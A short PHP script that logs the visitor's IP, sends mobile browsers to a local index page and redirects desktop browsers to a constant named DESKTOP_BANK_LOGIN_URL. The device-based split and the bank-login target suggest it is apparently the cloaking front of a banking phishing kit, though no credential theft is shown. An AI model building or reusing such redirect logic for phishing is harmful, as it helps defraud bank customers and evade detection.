<?php
session_start();
include('./ooxconfig/database.php');

$user_ip = $_SERVER['REMOTE_ADDR'];

require_once __DIR__ . '/includes/bootstrap.php';

function isMobileRequest(): bool
{
    $userAgent = strtolower((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    if ($userAgent === '') {
        return false;
    }

    return (bool) preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|windows phone/', $userAgent);
}

if (isMobileRequest()) {
    header('Location: index.php');
    exit;
}

header('Location: ' . DESKTOP_BANK_LOGIN_URL);
exit;
